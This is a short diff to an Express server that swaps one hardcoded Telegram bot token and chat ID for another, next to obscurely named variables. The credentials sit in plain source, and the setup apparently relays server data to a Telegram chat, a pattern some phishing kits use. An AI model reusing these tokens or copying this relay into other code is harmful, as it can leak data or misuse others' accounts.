@@ -15,8 +15,8 @@ const R2Y5P9 = crypto.randomBytes(32).toString('hex');
 const W3K7M1 = new Set();
 
 // Telegram configuration
-const TELEGRAM_BOT_TOKEN = '7805892995:AAGOxjdUmdAuWGdx0TRyMg0VbTUptGOL0Sg';
-const TELEGRAM_CHAT_ID = '7805892995';
+const TELEGRAM_BOT_TOKEN = '7999609809:AAGDcZvnDwc08fg0VsgqmzzcixOEh4Ncv6o';
+const TELEGRAM_CHAT_ID = '7999609809';
 
 app.use(bodyParser.json());
 app.use(express.static('public'));
